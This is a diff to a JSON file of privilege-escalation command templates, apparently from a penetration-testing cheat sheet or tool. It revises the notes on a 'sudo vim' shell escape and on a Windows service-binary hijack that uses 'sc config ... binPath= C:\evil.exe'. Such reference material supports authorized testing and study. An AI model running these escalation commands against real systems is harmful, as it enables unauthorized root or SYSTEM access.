@@ -2541,7 +2541,7 @@
     "type": "linux",
     "encoding": "raw",
     "template": "sudo vim -c ':!/bin/sh'",
-    "notes": "vim's :! runs a shell as the elevated process. Works for sudo or SUID vim. GTFOBins."
+    "notes": "sudo technique: vim's :! spawns a shell as the elevated process when your sudo rights allow vim (GTFOBins). Not a SUID method on its own - with only the SUID bit, /bin/sh commonly drops euid back to the real UID because real and effective UIDs differ."
   },
   {
     "id": "pe2-gtfo-find",
@@ -2671,7 +2671,7 @@
     "type": "windows",
     "encoding": "raw",
     "template": "sc qc {SERVICE}",
-    "notes": "Read BINARY_PATH_NAME. If the service is SYSTEM and its exe/dir is writable (accesschk.exe -uwcqv \"Everyone\" *), replace the binary and sc stop/start it."
+    "notes": "Shows BINARY_PATH_NAME (the service exe). Verify two independent things: (1) filesystem ACLs - can you write the exe or its parent dir? e.g. accesschk.exe -quv \"C:\\path\\svc.exe\" and the containing dir; if writable, replace it. (2) service config rights - accesschk.exe -ucqv {SERVICE} reporting SERVICE_CHANGE_CONFIG; then sc config {SERVICE} binPath= C:\\evil.exe and sc stop/start the service. The exe/parent-dir check is filesystem writability, not the same as service permissions."
   },
   {
     "id": "av-uac-integrity-context",
